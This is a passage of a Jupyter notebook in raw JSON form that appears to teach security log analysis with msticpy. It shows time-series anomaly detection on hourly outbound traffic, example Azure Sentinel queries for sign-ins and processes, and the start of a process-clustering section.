949],\"score\":{\"__ndarray__\":\"lDb1kSziGEBDb2xVUTkYQA==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[2]},\"seasonal\":[10633,8532],\"trend\":[21598,21373],\"weights\":[1,1]},\"selected\":{\"id\":\"1107\"},\"selection_policy\":{\"id\":\"1108\"}},\"id\":\"1094\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1186\",\"type\":\"DaysTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"1142\"},\"glyph\":{\"id\":\"1144\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1145\"},\"view\":{\"id\":\"1147\"}},\"id\":\"1146\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"1192\",\"type\":\"YearsTicker\"},{\"attributes\":{},\"id\":\"1051\",\"type\":\"Selection\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1190\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"label\":{\"value\":\"baseline\"},\"renderers\":[{\"id\":\"1071\"}]},\"id\":\"1093\",\"type\":\"LegendItem\"},{\"attributes\":{\"fill_color\":{\"value\":\"blue\"},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"score\"}},\"id\":\"1144\",\"type\":\"Circle\"},{\"attributes\":{\"active_multi\":null,\"tools\":[{\"id\":\"1004\"},{\"id\":\"1024\"},{\"id\":\"1025\"},{\"id\":\"1026\"},{\"id\":\"1027\"},{\"id\":\"1028\"}]},\"id\":\"1030\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"1052\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"fill_color\":{\"value\":\"#1f77b4\"},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1042\",\"type\":\"Circle\"},{\"attributes\":{\"overlay\":{\"id\":\"1149\"},\"x_range\":{\"id\":\"1008\"},\"y_range\":null},\"id\":\"1148\",\"type\":\"RangeTool\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1140\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AADAwRYyd0IAAKgwGjJ3QgAAkJ8dMndCAAB4DiEyd0IAAGB9JDJ3QgAASOwnMndCAAAwWysyd0IAABjKLjJ3QgAAADkyMndCAADopzUyd0IAANAWOTJ3QgAAuIU8MndCAACg9D8yd0IAAIhjQzJ3QgAAcNJGMndCAABYQUoyd0IAAECwTTJ3QgAAKB9RMndCAAAQjlQyd0IAAPj8VzJ3QgAA4GtbMndCAADI2l4yd0IAALBJYjJ3QgAAmLhlMndCAACAJ2kyd0IAAGiWbDJ3QgAAUAVwMndCAAA4dHMyd0IAACDjdjJ3QgAACFJ6MndCAADwwH0yd0IAANgvgTJ3QgAAwJ6EMndCAACoDYgyd0IAAJB8izJ3QgAAeOuOMndCAABgWpIyd0IAAEjJlTJ3QgAAMDiZMndCAAAYp5wyd0IAAAAWoDJ3QgAA6ISjMndCAADQ86Yyd0IAALhiqjJ3QgAAoNGtMndCAACIQLEyd0IAAHCvtDJ3QgAAWB64MndCAABAjbsyd0IAACj8vjJ3QgAAEGvCMndCAAD42cUyd0IAAOBIyTJ3QgAAyLfMMndCAACwJtAyd0IAAJiV0zJ3QgAAgATXMndCAABoc9oyd0IAAFDi3TJ3QgAAOFHhMndCAAAgwOQyd0IAAAgv6DJ3QgAA8J3rMndCAADYDO8yd0IAAMB78jJ3QgAAqOr1MndCAACQWfkyd0IAAHjI/DJ3QgAAYDcAM3dCAABIpgMzd0IAADAVBzN3QgAAGIQKM3dCAAAA8w0zd0IAAOhhETN3QgAA0NAUM3dCAAC4Pxgzd0IAAKCuGzN3QgAAiB0fM3dCAABwjCIzd0IAAFj7JTN3QgAAQGopM3dCAAAo2Swzd0IAABBIMDN3QgAA+LYzM3dCAADgJTczd0IAAMiUOjN3QgAAsAM+M3dCAACYckEzd0IAAIDhRDN3QgAAaFBIM3dCAABQv0szd0IAADguTzN3QgAAIJ1SM3dCAAAIDFYzd0IAAPB6WTN3QgAA2OlcM3dCAADAWGAzd0IAAKjHYzN3QgAAkDZnM3dCAAB4pWozd0IAAGAUbjN3QgAASINxM3dCAAAw8nQzd0IAABhheDN3QgAAANB7M3dCAADoPn8zd0IAANCtgjN3QgAAuByGM3dCAACgi4kzd0IAAIj6jDN3QgAAcGmQM3dCAABY2JMzd0IAAEBHlzN3QgAAKLaaM3dCAAAQJZ4zd0IAAPiToTN3QgAA4AKlM3dCAADIcagzd0IAALDgqzN3QgAAmE+vM3dCAACAvrIzd0IAAGgttjN3QgAAUJy5M3dCAAA4C70zd0IAACB6wDN3QgAACOnDM3dCAADwV8czd0IAANjGyjN3QgAAwDXOM3dCAACopNEzd0IAAJAT1TN3QgAAeILYM3dCAABg8dszd0IAAEhg3zN3QgAAMM/iM3dCAAAYPuYzd0IAAACt6TN3QgAA6BvtM3dCAADQivAzd0IAALj58zN3QgAAoGj3M3dCAACI1/ozd0IAAHBG/jN3QgAAWLUBNHdCAABAJAU0d0IAACiTCDR3QgAAEAIMNHdCAAD4cA80d0IAAODfEjR3QgAAyE4WNHdCAACwvRk0d0IAAJgsHTR3QgAAgJsgNHdCAABoCiQ0d0IAAFB5JzR3QgAAOOgqNHdCAAAgVy40d0IAAAjGMTR3QgAA8DQ1NHdCAADYozg0d0IAAMASPDR3QgAAqIE/NHdCAACQ8EI0d0IAAHhfRjR3QgAAYM5JNHdCAABIPU00d0IAADCsUDR3QgAAGBtUNHdC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"TotalBytesSent\":[10823,14821,13532,11947,11193,13257,13375,27975,31501,28775,31398,32979,32241,33539,28420,25757,30947,27803,29637,29670,11563,13465,13587,14967,12964,13858,13119,13907,12739,11227,11268,31322,26683,32982,32544,31414,28254,29893,31290,28334,26328,26448,30576,30793,10484,14995,11715,11296,10487,10789,14758,10998,10682,14572,13689,34167,27286,33955,33700,26810,30679,31533,33739,32815,26046,27499,33974,29118,12821,12836,13819,14877,14220,10053,14690,13161,14334,12806,11771,25544,27355,33777,27055,27816,32648,25686,32147,33363,28923,31547,33575,26369,14754,10415,10286,12086,11414,14915,14479,14063,13211,12485,14759,26964,31469,26214,33556,32596,25150,31064,25338,25714,26089,25673,48616,45856,11654,13127,12184,14179,13841,11097,13724,10535,10022,12570,14145,18473,19477,19080,17622,18725,17612,19733,19338,18656,17732,17801,16167,16485,11455,10545,13991,10699,12735,12639,14501,12477,11497,10081,11729,18121,17458,18104,16508,17814,16494,17588,18545,19534,16085,15276,15363,18166,13830,13350,11842,11111],\"anomalies\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"baseline\":[11187,14007,13280,12238,11314,12641,12350,30664,29442,31531,32547,32060,31540,32721,30726,27678,29255,27470,28928,28791,10907,13894,12754,13436,11796,13334,13807,12503,11862,12800,12552,29979,28690,31444,31693,30566,30470,31010,30430,28406,28016,27368,31130,29511,11469,13234,12458,13336,12055,12579,14104,12723,12402,13021,13045,29441,28468,31613,31518,30080,30103,30386,30901,29854,27887,28203,34349,31499,12950,13611,13072,13965,12753,12328,14733,12960,12805,13258,13457,28209,27735,30514,30198,28394,28438,28562,29639,29520,26364,27468,35919,32037,13313,12912,13020,14080,14269,13789,16208,14404,14225,14694,15656,26848,27373,28686,28393,27900,27131,27913,28314,28378,25707,26105,32232,29906,14825,13953,14045,13866,14136,13332,15009,12709,11857,11592,12842,20300,21208,20687,20314,20820,18816,20331,19942,20270,18209,18082,22571,22484,11144,10574,10923,10288,11477,11094,12823,10765,9983,9851,12111,16511,18096,16513,16469,18378,15622,18256,17387,18026,16531,15796,17900,20157,13089,12694,13044,11487],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167],\"residual\":[-364,813,251,-291,-121,615,1024,-2689,2058,-2756,-1149,918,700,817,-2306,-1921,1691,332,708,878,655,-429,832,1530,1167,523,-688,1403,876,-1573,-1284,1342,-2007,1537,850,847,-2216,-1117,859,-72,-1688,-920,-554,1281,-985,1760,-743,-2040,-1568,-1790,653,-1725,-1720,1550,643,4725,-1182,2341,2181,-3270,575,1146,2837,2960,-1841,-704,-375,-2381,-129,-775,746,911,1466,-2275,-43,200,1528,-452,-1686,-2665,-380,3262,-3143,-578,4209,-2876,2507,3842,2558,4078,-2344,-5668,1440,-2497,-2734,-1994,-2855,1125,-1729,-341,-1014,-2209,-897,115,4095,-2472,5162,4695,-1981,3150,-2976,-2664,381,-432,16383,15949,-3171,-826,-1861,312,-295,-2235,-1285,-2174,-1835,977,1302,-1827,-1731,-1607,-2692,-2095,-1204,-598,-604,-1614,-477,-281,-6404,-5999,310,-29,3067,410,1257,1544,1677,1711,1513,229,-382,1609,-638,1590,38,-564,871,-668,1157,1507,-446,-520,-2537,-1991,740,655,-1202,-376],\"score\":{\"__ndarray__\":\"wXsqBZ0ywr+h30T8qIXTPy3+xdGRbLc/Qy/71X1Lvb/w3KS70YSpvwZYxigsas0/H8eTFymn2D/p2TyNrWjwvwJVXrD35eg/q6FE3vLQ8L99K6a3BjDcv3UMLTlME9Y/HERoszjG0D/6Fj+Cj57TPyOaTsw+Key/nvKk3Oh6578FqiduqG/kPy+B8TWCTb8/zbJcvwX40D8A42b9ShrVP/GqUqAuXM8/foJuB+Fbxb+GZqn47/vTPy8Q3CWJeuI/vQFFTVoh3D8eZtAVwPDIP+PAwOY++tC/kuH3lj3v4D9Ux2m61w3VPxOLoBi9P+O/afdi4Wp437+P+2PZXzHgP5XF5vyWhui/nQAX21KQ4j+UX49T/WvUPxK2E29QWdQ/f6sPaR0R67+5cNSH0mjbvxtcAgEEpNQ/G1q34yT5n7+rZo3erqXkv/JKcUF5nta/mwUFvShwy78YK6A3BOfeP1BOk0IbM9i/Yce1sWxG5T/kOfGYoFDSv+PpjuVN7ei/eyjkBC0w479UqMMKKuPlv5hzWBpIQ88/paYyCtkY5b8NRHb2SAnlv42azXTJuOI/3l51fMfGzj/1E4s0lan8Pxh09oh0/dy/3brRc9JW7D/zZ0X8z2TqP6fTSm7g8PO/HAU6sSl4yz8sX+MNoJ7bPyeRNXNTL/E/oBopmb/u8T8oyd6g54Hmv0Weqf7YXdG/KKwK5pC7wr8BYVj0rxLtv3lSSBs6E6u/qfTCyNQX07+WwCW4k+TRP5ort86459U/a1UK9lSz4T+sAyWFwcjrv/1FVi6wsJS/ivfsIKV2sj9Zgl2ET3TiP/j+Kww8esa/1dgOPXWf5L/khkXEU0Pwv4U2/DTR+cK/R+/7ub7E8z9ZvNimOivzv8GdvwT3msy/DpvF04qG+T/DQBnLs4vxv0q32c+BW+4/kEWqMmNL9z8f2PRlP/ruP+r11Gqruvg/ByGzyIWf7L9O/RMPa0IBwIshncJnYuE/hYMEi7577r+SlQzmta7wv6YrMGMgXui/H9hAOwVr8b+bvIHO5RvbP1HCL01MJeW/R/9sAEIUwb+RX+mNoufYvxK71LNT++q/tYwSv0sP1r9ILrFJNWSkP7jQLlkg1fg/kJZWKO4t7r+XG81frVH/Py/sVfnkevw/tpF5yak16L/bayQQcRbzP60adZBUJ/K/buPlW8VB8L+QDGvt0AjCP4PVZdA6gcW/lDb1kSziGEBDb2xVUTkYQDSdThHOVvO/UTb59E9V1L+GU9DvJ8Dmv0QuZb5/W70/pQzk7Revvb/x7kHnQEzrvz+F4YKkft+/7giuKWOO6r+mH2O8Om/mv8+8V3GUgtc/qc0Bd75p3z9N6Gg2VFbmvydQru6FK+W/S/YH0pCp479JxFvGWG3wv2Qmp75+mOm/f6TWaWiG3b83x4VA+JPNv0BtdNKr3s2/uOZCh1q/47/LsuOWfbHHv84FNZp8Ury/QvaOGCF/A8DJKeiI+0MCwJO/cLKyKb0/P1U0v4V8jr/AbCI5RZXyPxQvF4TfccM/Bd/CE51R3j8K8VGQHKbiPyrJsQMVROQ/YjQZveit5D+TWihJn0XiP5E8RU7CSLU/3W32urcSw7+68uKQbXDjPyEaErj6hc+/R6+wEko14z8cjK/EIqaFP1Ya6Fqp7Mu/JQLxkrfu1D8prN1Ivn3Qv193U/4Z49s/EbGsZPIy4j/uWD16iC/Gv7pYZ9fZyMm/P5jnKD/47r/kVvLwyVTov5JtLu85v9E/8apSoC5czz/SiNkm9Xndv9THBykEyMK/\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"seasonal\":[-10756,-7953,-8697,-9756,-10696,-9384,-9691,8607,7371,9446,10451,9953,9422,10593,8591,5536,7107,5316,6769,6628,-11261,-8280,-9428,-8756,-10385,-8835,-8347,-9634,-10254,-9288,-9505,7958,6710,9506,9796,8706,8644,9210,8648,6634,6245,5590,9335,7690,-10386,-8661,-9482,-8650,-9974,-9493,-8009,-9429,-9788,-9206,-9218,7140,6131,9240,9113,7648,7648,7913,8416,7361,5392,5710,11862,9021,-9516,-8842,-9364,-8452,-9641,-10039,-7602,-9339,-9454,-8958,-8714,6084,5661,8490,8223,6463,6546,6699,7796,7686,4528,5618,14048,10140,-8612,-9048,-8988,-7986,-7865,-8418,-6074,-7950,-8193,-7776,-6853,4315,4832,6151,5880,5424,4709,5565,6062,6248,3727,4303,10633,8532,-6302,-6906,-6524,-6391,-5789,-6245,-4208,-6142,-6629,-6534,-4936,2855,4081,3858,3764,4527,2756,4475,4259,4727,2775,2730,7286,7253,-4041,-4576,-4198,-4811,-3607,-3979,-2234,-4275,-5042,-5159,-2886,1527,3124,1555,1525,3449,709,3359,2509,3168,1695,982,3111,5395,-1643,-2008,-1625,-3149],\"trend\":[21943,21961,21977,21994,22010,22026,22042,22056,22070,22084,22096,22107,22117,22127,22135,22142,22148,22154,22158,22163,22168,22174,22182,22193,22181,22169,22155,22137,22116,22089,22058,22021,21980,21938,21897,21859,21826,21799,21781,21771,21770,21777,21795,21821,21855,21896,21941,21986,22030,22073,22114,22153,22191,22227,22264,22300,22337,22372,22404,22432,22455,22473,22485,22492,22495,22493,22487,22477,22466,22453,22437,22417,22394,22367,22335,22299,22259,22217,22172,22124,22074,22024,21975,21930,21892,21863,21843,21834,21836,21849,21870,21896,21925,21961,22008,22066,22134,22208,22283,22355,22418,22471,22509,22533,22541,22534,22512,22475,22421,22348,22252,22129,21979,21801,21598,21373,21128,20860,20570,20257,19925,19577,19217,18852,18486,18127,17778,17444,17127,16828,16549,16292,16060,15855,15682,15542,15434,15351,15285,15231,15186,15150,15121,15100,15085,15074,15058,15041,15025,15011,14997,14984,14971,14957,14943,14929,14913,14896,14877,14858,14836,14813,14788,14761,14733,14702,14670,14636],\"weights\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"1179\"},\"selection_policy\":{\"id\":\"1180\"}},\"id\":\"1142\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1053\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1059\",\"type\":\"DaysTicker\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1054\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1055\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1056\",\"type\":\"DaysTicker\"}],\"root_ids\":[\"1153\"]},\"title\":\"Bokeh Application\",\"version\":\"2.3.0\"}};\n",
       "  var render_items = [{\"docid\":\"88462ba9-12be-4abc-b086-b2c8219a3425\",\"root_ids\":[\"1153\"],\"roots\":{\"1153\":\"ceb2ceec-130f-401c-a23a-29a7e769e223\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1153"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>We can see two clearly anomalous data points representing unusual outbound traffic.<hr></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.nbtools.timeseries import display_timeseries_anomolies\n",
    "from msticpy.analysis.timeseries import timeseries_anomalies_stl\n",
    "\n",
    "# Conduct our timeseries analysis\n",
    "ts_analysis = timeseries_anomalies_stl(ob_bytes_per_hour)\n",
    "# Visualize the timeseries and any anomalies\n",
    "display_timeseries_anomolies(data=ts_analysis, y= 'TotalBytesSent');\n",
    "\n",
    "md(\"We can see two clearly anomalous data points representing unusual outbound traffic.<hr>\", \"bold\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### View the summary events marked as anomalous"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "gather": {
     "logged": 1618336459592
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.dataresource+json": {
       "data": [
        {
         "TimeGenerated": "2020-07-10T18:00:00.000Z",
         "TotalBytesSent": 48616,
         "anomalies": 1,
         "baseline": 32232,
         "index": 114,
         "residual": 16383,
         "score": 6.2208731466,
         "seasonal": 10633,
         "trend": 21598,
         "weights": 1
        },
        {
         "TimeGenerated": "2020-07-10T19:00:00.000Z",
         "TotalBytesSent": 45856,
         "anomalies": 1,
         "baseline": 29906,
         "index": 115,
         "residual": 15949,
         "score": 6.0559743259,
         "seasonal": 8532,
         "trend": 21373,
         "weights": 1
        }
       ],
       "schema": {
        "fields": [
         {
          "name": "index",
          "type": "integer"
         },
         {
          "name": "TimeGenerated",
          "type": "datetime",
          "tz": "UTC"
         },
         {
          "name": "TotalBytesSent",
          "type": "integer"
         },
         {
          "name": "residual",
          "type": "integer"
         },
         {
          "name": "trend",
          "type": "integer"
         },
         {
          "name": "seasonal",
          "type": "integer"
         },
         {
          "name": "weights",
          "type": "integer"
         },
         {
          "name": "baseline",
          "type": "integer"
         },
         {
          "name": "score",
          "type": "number"
         },
         {
          "name": "anomalies",
          "type": "integer"
         }
        ],
        "pandas_version": "0.20.0",
        "primaryKey": [
         "index"
        ]
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>TotalBytesSent</th>\n",
       "      <th>residual</th>\n",
       "      <th>trend</th>\n",
       "      <th>seasonal</th>\n",
       "      <th>weights</th>\n",
       "      <th>baseline</th>\n",
       "      <th>score</th>\n",
       "      <th>anomalies</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>114</th>\n",
       "      <td>2020-07-10 18:00:00+00:00</td>\n",
       "      <td>48616</td>\n",
       "      <td>16383</td>\n",
       "      <td>21598</td>\n",
       "      <td>10633</td>\n",
       "      <td>1</td>\n",
       "      <td>32232</td>\n",
       "      <td>6.220873</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>115</th>\n",
       "      <td>2020-07-10 19:00:00+00:00</td>\n",
       "      <td>45856</td>\n",
       "      <td>15949</td>\n",
       "      <td>21373</td>\n",
       "      <td>8532</td>\n",
       "      <td>1</td>\n",
       "      <td>29906</td>\n",
       "      <td>6.055974</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                TimeGenerated  TotalBytesSent  residual  trend  seasonal  \\\n",
       "114 2020-07-10 18:00:00+00:00           48616     16383  21598     10633   \n",
       "115 2020-07-10 19:00:00+00:00           45856     15949  21373      8532   \n",
       "\n",
       "     weights  baseline     score  anomalies  \n",
       "114        1     32232  6.220873          1  \n",
       "115        1     29906  6.055974          1  "
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "max_score, min_score = ts_analysis.score.max(), ts_analysis.min()\n",
    "ts_analysis[ts_analysis[\"anomalies\"] == 1]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Extract the anomaly period\n",
    "We can extract the **start** and **end** times of anomalous events and \n",
    "use this more-focused time range to query for unusual activity in this period.\n",
    "\n",
    "> **Note**: if more than one anomalous period is indicated we can use<br>\n",
    "> `msticpy.analysis.timeseries.extract_anomaly_periods()` function to isolate\n",
    "> time blocks around the anomalous periods."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "gather": {
     "logged": 1618336462962
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style='font-size: 130%'>Anomalous network traffic detected between:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Start time: <b>2020-07-10 17:00:00+00:00</b><br>End time: <b>2020-07-10 20:00:00+00:00</b><hr></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Identify when the anomalies occur so that we can use this timerange\n",
    "# to scope the next stage of our investigation.\n",
    "# Add a 1 hour buffer around the anomalies\n",
    "start = ts_analysis[ts_analysis['anomalies']==1]['TimeGenerated'].min() -  pd.to_timedelta(1, unit='h')\n",
    "end = ts_analysis[ts_analysis['anomalies']==1]['TimeGenerated'].max() +  pd.to_timedelta(1, unit='h')\n",
    "\n",
    "# md and md_warn are MSTICpy features to provide simple, and clean output in notebook cells\n",
    "md(\"Anomalous network traffic detected between:\", \"large\")\n",
    "md(f\"Start time: <b>{start}</b><br>End time: <b>{end}</b><hr>\",)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Time Series Conclusion\n",
    "\n",
    "We would take these start and end times to zero in on which machines\n",
    "were responsible for the anomalous traffic. Once we find them we can\n",
    "use other techniques to analyze what's going on on these hosts."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Other Applications\n",
    "\n",
    "You can use the msticpy query function `MultiDataSource.get_timeseries_anomalies` on most Azure Sentinel tables to do this summarization directly.\n",
    "\n",
    "Three examples are shown below.\n",
    "\n",
    "```python\n",
    "start = pd.Timestamp(\"2020-09-01T00:00:00\")\n",
    "end = pd.Timestamp(\"2020-09-301T00:00:00\")\n",
    "\n",
    "# Sent bytes by hour (default) from Palo Alto devices\n",
    "time_series_net_bytes = qry_prov.MultiDataSource.get_timeseries_decompose(\n",
    "    start=start,\n",
    "    end=end,\n",
    "    table=\"CommonSecurityLog\",\n",
    "    timestampcolumn=\"TimeGenerated\",\n",
    "    aggregatecolumn=\"SentBytes\",\n",
    "    groupbycolumn=\"DeviceVendor\",\n",
    "    aggregatefunction=\"sum(SentBytes)\",\n",
    "    where_clause='|where DeviceVendor==\"Palo Alto Networks\"',\n",
    ")\n",
    "\n",
    "# Sign-in failure count in AAD\n",
    "time_series_signin_fail = qry_prov.MultiDataSource.get_timeseries_anomalies(\n",
    "    table=\"SigninLogs\",\n",
    "    start=start,\n",
    "    end=end,\n",
    "    timestampcolumn=\"TimeGenerated\",\n",
    "    aggregatecolumn=\"AppDisplayName\",\n",
    "    groupbycolumn=\"ResultType\",\n",
    "    aggregatefunction=\"count(AppDisplayName)\",\n",
    "    where_clause='| where ResultType in (50126, 50053, 50074, 50076)',\n",
    "    add_query_items='| project-rename Total=AppDisplayName',\n",
    ")\n",
    "\n",
    "# Number of distinct processes by hour\n",
    "time_series_procs = qry_prov.MultiDataSource.get_timeseries_anomalies(\n",
    "    table=\"SecurityEvent\",\n",
    "    start=start,\n",
    "    end=end,\n",
    "    timestampcolumn=\"TimeGenerated\",\n",
    "    aggregatecolumn=\"DistinctProcesses\",\n",
    "    groupbycolumn=\"Account\",\n",
    "    aggregatefunction=\"dcount(NewProcessName)\",\n",
    "    where_clause=\"| where Computer='myhost.domain.con'\",\n",
    ")\n",
    "\n",
    "# Then submit to ts anomalies decomposition\n",
    "ts_analysis = timeseries_anomalies_stl(time_series_procs)\n",
    "# Visualize the timeseries and any anomalies\n",
    "display_timeseries_anomolies(data=ts_analysis, y='Total');\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<hr>\n",
    "\n",
    "# Using Clustering \n",
    "## - Example: aggregating similar process patterns to highlight unusual logon sessions\n",
    "\n",
    "Sifting through thousands of events from a host is tedious in the extreme.\n",
    "We want to find a better way of identifying suspicious clusters of activity.\n",
    "\n",
    "Query the data and do some initial analysis of the results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "gather": {
     "logged": 1618336881381
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Getting process events..."
     ]
    },
    {
     "data": {
      "text/html": [
       "<p style='font-size: 130%;font-weight: bold'>Initial analysis of data set</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Total processes in data set <b>22979</b></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Total distinct Account in data <b>5</b></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Total distinct NewProcessName in data <b>192</b></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Total distinct CommandLine in data <b>4552</b></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''><hr></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style='font-size: 130%'>Try grouping by distinct Account, Process, Commandline<br> - we still have 1000s of rows!</p>"
      ],
